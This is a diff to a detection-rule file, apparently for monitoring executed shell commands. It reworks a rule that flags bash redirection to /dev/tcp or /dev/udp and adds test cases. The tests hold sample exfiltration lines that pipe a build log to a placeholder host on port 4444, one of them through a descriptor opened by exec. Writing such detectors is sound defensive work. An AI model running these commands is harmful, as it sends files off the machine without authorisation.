@@ -116,12 +116,13 @@ definitions:
   - name: egress_dev_tcp
     params: [e]
     description: >
-      The command line redirects to or from bash's /dev/tcp or /dev/udp, and the path is not a
-      word of a command that is not a shell (a commit message, an echo argument).
+      A command of the command line redirects to or from bash's /dev/tcp or /dev/udp, its own
+      redirection or through a descriptor an earlier exec opened on one. The same path as a word
+      of a command (a commit message, an echo argument) is not a redirection. A command line
+      that does not parse is matched on its text.
     body: >
-      e.command.command.matches("[<>][&|]?\\s*/dev/(tcp|udp)/") &&
-      !e.command.parsed_commands.exists(w, !w.name.matches("(?i)^(ba|z|da|k)?sh$") &&
-        w.argv_raw.exists(a, a.matches("/dev/(tcp|udp)/")))
+      e.command.parsed_commands.exists(c, size(c.socket_redirects) > 0) ||
+      (size(e.command.parsed_commands) == 0 && e.command.command.matches("[<>][&|]?\\s*/dev/(tcp|udp)/"))
     tests:
       - name: redirect_to_a_socket
         verdict: match
@@ -138,3 +139,13 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "echo 'cat x > /dev/tcp/host.example/4444' >> notes.md" }
+      - name: descriptor_an_exec_opened
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "exec 3<>/dev/tcp/host.example/4444; cat build.log >&3" }
+      - name: command_line_that_does_not_parse
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat build.log > /dev/tcp/host.example/4444 )" }
